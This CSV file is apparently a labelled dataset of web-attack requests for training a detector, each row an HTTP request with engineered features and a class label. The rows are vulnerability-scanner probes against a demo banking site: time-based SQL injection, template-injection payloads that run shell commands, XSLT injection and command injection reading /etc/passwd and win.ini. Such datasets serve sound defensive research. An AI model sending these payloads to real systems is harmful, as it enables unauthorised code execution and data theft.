method,path,body,single_q,double_q,dashes,braces,spaces,percentages,semicolons,angle_brackets,special_chars,path_length,body_length,badwords_count,class
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,4,2,1,1,14,0,1,0,0,12,174,4,1
GET,/Privacypolicy.jsp?sec=%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29&template=US,,10,0,0,6,28,0,0,0,0,335,0,9,1
GET,/Documents/JohnSmith/index.jsp?content=%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29,,10,0,0,6,28,0,0,0,0,339,0,9,1
POST,/sendFeedback,cfile=comments.txt%27+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+%2F+%27&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,12,0,0,6,39,0,0,0,0,13,432,9,1
POST,/doSubscribe,txtEmail=ZAP%22+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+%2F+%22&btnSubmit=Subscribe,10,2,0,6,32,0,0,0,0,12,340,9,1
GET,/Privacypolicy.jsp?sec=Careers+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+&template=US,,10,0,0,6,31,0,0,0,0,346,0,9,1
GET,/disclaimer.htm?url=%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29,,10,0,0,6,28,0,0,0,0,320,0,9,1
GET,/default.jsp?content=%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29,,10,0,0,6,28,0,0,0,0,321,0,9,1
GET,/index.jsp?content=inside_jobs.htm%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+&job=MortgageLendingAccountExecutive%3ASales,,2,1,1,0,5,0,0,0,0,104,0,2,1
GET,/images/index.jsp?content=personal.htm%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,2,1,1,0,5,0,0,0,0,66,0,2,1
GET,/index.jsp?content=inside_volunteering.htm%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,2,1,1,0,5,0,0,0,0,70,0,2,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/subscribe.jsp,,0,0,0,0,3,0,0,0,0,57,0,0,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/subscribe.jsp,,0,0,0,0,3,0,0,0,0,57,0,0,1
GET,/search.jsp?query=zj%23set%28%24x%3D2916*4972%29%24%7Bx%7Dzj,,0,0,0,1,0,0,0,0,0,44,0,0,1
GET,/search.jsp?query=zj%7B%7Bprint+%223596%22+%223690%22%7D%7Dzj,,0,4,0,0,2,0,0,0,0,45,0,0,1
POST,/doLogin,uid=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D&passw=ZAP&btnSubmit=Login,0,4,0,2,5,0,0,2,0,8,106,2,1
POST,/doSubscribe,txtEmail=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D&btnSubmit=Subscribe,0,4,0,2,5,0,0,2,0,12,105,1,1
POST,/doLogin,uid=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D&passw=ZAP&btnSubmit=Login,0,4,0,2,2,0,0,0,0,8,94,2,1
GET,/Documents/JohnSmith/index.jsp?content=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D,,4,4,0,6,2,0,0,0,0,165,0,1,1
GET,/default.jsp?content=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D,,0,10,0,5,1,0,0,0,0,168,0,1,1
GET,/index.jsp?content=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D&job=MortgageLendingAccountExecutive%3ASales,,4,4,0,6,2,0,0,0,0,187,0,1,1
GET,/disclaimer.htm?url=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D,,0,10,0,5,1,0,0,0,0,167,0,1,1
GET,/images/index.jsp?content=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,,2,2,1,1,1,0,0,3,0,84,0,2,1
GET,/images/index.jsp?content=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Fdemo.testfire.net%3A22%27%29%22%2F%3E,,2,2,0,1,1,0,0,2,0,90,0,1,1
GET,/images/index.jsp?content=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,,2,14,0,3,7,0,0,8,0,271,0,5,1
GET,/search.jsp?query=system-property%28%27xsl%3Avendor%27%29%2F%3E,,2,0,0,1,0,0,0,1,0,49,0,1,1
POST,/doLogin,uid=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&passw=ZAP&btnSubmit=Login,2,14,0,3,7,0,0,8,0,8,275,6,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,,2,3,1,1,4,0,0,4,0,123,0,2,1
GET,/index.jsp?content=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,,2,14,0,3,7,0,0,8,0,264,0,5,1
GET,/index.jsp?content=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,,2,2,0,1,1,0,0,2,0,73,0,2,1
GET,/images/index.jsp?content=system-property%28%27xsl%3Avendor%27%29%2F%3E,,2,0,0,1,0,0,0,1,0,57,0,1,1
POST,/sendFeedback,cfile=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,2,2,0,1,8,0,0,2,0,13,166,2,1
POST,/sendFeedback,cfile=system-property%28%27xsl%3Avendor%27%29%2F%3E&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,2,0,0,1,7,0,0,1,0,13,143,1,1
POST,/doSubscribe,txtEmail=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&btnSubmit=Subscribe,2,2,0,1,1,0,0,2,0,12,83,2,1
POST,/doLogin,uid=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&passw=ZAP&btnSubmit=Login,2,2,0,1,1,0,0,2,0,8,84,3,1
POST,/doLogin,uid=%00&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,31,1,1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D,4,4,0,6,2,0,0,0,0,8,154,2,1
POST,/sendFeedback,cfile=comments.txt&name=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,10,0,5,8,0,0,0,0,13,268,1,1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D,0,10,0,5,1,0,0,0,0,12,170,1,1
GET,/disclaimer.htm?url=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D,,0,4,0,2,2,0,0,0,0,85,0,1,1
GET,/index.jsp?content=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D,,0,4,0,2,2,0,0,0,0,83,0,1,1
POST,/sendFeedback,cfile=comments.txt&name=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,4,0,2,12,0,0,2,0,13,197,1,1
GET,/survey_questions.jsp?step=%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D,,0,6,0,8,1,0,0,0,0,169,0,2,1
GET,/index.jsp?content=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D&job=MortgageLendingAccountExecutive%3ASales,,0,10,0,5,1,0,0,0,0,208,0,1,1
GET,/index.jsp?content=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D,,0,10,0,5,1,0,0,0,0,166,0,1,1
GET,/disclaimer.htm?url=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D,,0,4,0,2,2,0,0,0,0,84,0,1,1
GET,/search.jsp?query=%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D,,0,6,0,8,1,0,0,0,0,160,0,2,1
GET,/Privacypolicy.jsp?sec=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D&template=US,,0,4,0,2,2,0,0,0,0,100,0,1,1
GET,/Documents/JohnSmith/index.jsp?content=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D,,0,4,0,2,2,0,0,0,0,104,0,1,1
GET,/default.jsp?content=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D,,0,4,0,2,2,0,0,0,0,85,0,1,1
POST,/doSubscribe,txtEmail=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D&btnSubmit=Subscribe,0,10,0,5,1,0,0,0,0,12,176,1,1
POST,/sendFeedback,cfile=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,10,0,5,8,0,0,0,0,13,259,1,1
POST,/doLogin,uid=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D&passw=ZAP&btnSubmit=Login,0,10,0,5,1,0,0,0,0,8,177,2,1
GET,/search.jsp?query=zj%3Cp+th%3Atext%3D%22%24%7B9291*7628%7D%22%3E%3C%2Fp%3Ezj,,0,2,0,0,1,0,0,4,0,52,0,0,1
POST,/sendFeedback,cfile=comments.txt&name=zj%7B%7B%3D3008*2964%7D%7Dzj&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,139,0,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=zj%3C%25%3D7817*1627%25%3Ezj,,0,0,0,0,3,0,0,2,0,80,0,0,1
GET,/index.jsp?content=zj%3Cp+th%3Atext%3D%22%24%7B9369*6760%7D%22%3E%3C%2Fp%3Ezj&job=MortgageLendingAccountExecutive%3ASales,,0,2,0,0,1,0,0,4,0,95,0,0,1
GET,/index.jsp?content=zj%3Cp+th%3Atext%3D%22%24%7B5343*6468%7D%22%3E%3C%2Fp%3Ezj,,0,2,0,0,1,0,0,4,0,53,0,0,1
GET,/disclaimer.htm?url=zj%7B%40math+key%3D%222579%22+method%3D%22multiply%22+operand%3D%225121%22%2F%7Dzj,,0,6,0,0,3,0,0,0,0,76,0,0,1
GET,/images/index.jsp?content=zj%3Cp+th%3Atext%3D%22%24%7B4206*7594%7D%22%3E%3C%2Fp%3Ezj,,0,2,0,0,1,0,0,4,0,60,0,0,1
GET,/images/index.jsp?content=zj%7B%405223*5104%7Dzj,,0,0,0,0,0,0,0,0,0,42,0,0,1
POST,/sendFeedback,cfile=zj%3Cp+th%3Atext%3D%22%24%7B3611*8366%7D%22%3E%3C%2Fp%3Ezj&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,2,0,0,8,0,0,4,0,13,146,0,1
POST,/doSubscribe,txtEmail=zj%3Cp+th%3Atext%3D%22%24%7B9075*2660%7D%22%3E%3C%2Fp%3Ezj&btnSubmit=Subscribe,0,2,0,0,1,0,0,4,0,12,63,0,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=zj%7B6300*7258%7Dzj,,0,0,0,0,3,0,0,0,0,77,0,0,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%22%3Bcat+%2Fetc%2Fpasswd%3B%22,0,2,0,0,8,0,2,0,0,13,143,0,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%27%26cat+%2Fetc%2Fpasswd%26%27,2,0,0,0,8,0,0,0,0,13,143,0,1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=type+%25SYSTEMROOT%25%5Cwin.ini,0,0,0,0,1,0,0,0,0,8,53,2,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=type+%25SYSTEMROOT%25%5Cwin.ini&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,8,0,0,0,0,13,146,1,1
GET,/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales%27%26sleep+15.0%26%27,,2,0,0,0,1,0,0,0,0,90,0,1,1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=Login%26type+%25SYSTEMROOT%25%5Cwin.ini,0,0,0,0,1,0,0,0,0,8,59,2,1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=Login%27%26sleep+15.0%26%27,2,0,0,0,1,0,0,0,0,8,47,2,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP%27%26sleep+15.0%26%27&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,2,0,0,0,8,0,0,0,0,13,138,1,1
GET,/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales%22%26sleep+15.0%26%22,,0,2,0,0,1,0,0,0,0,90,0,1,1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=Login%27%3Bsleep+15.0%3B%27,2,0,0,0,1,0,2,0,0,8,47,2,1
GET,/default.jsp?content=case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end,,2,0,0,2,11,0,0,1,0,85,0,1,1
GET,/Documents/JohnSmith/index.jsp?content=case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+,,2,0,1,2,13,0,0,1,0,107,0,1,1
GET,/disclaimer.htm?url=case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end,,2,0,0,2,11,0,0,1,0,84,0,1,1
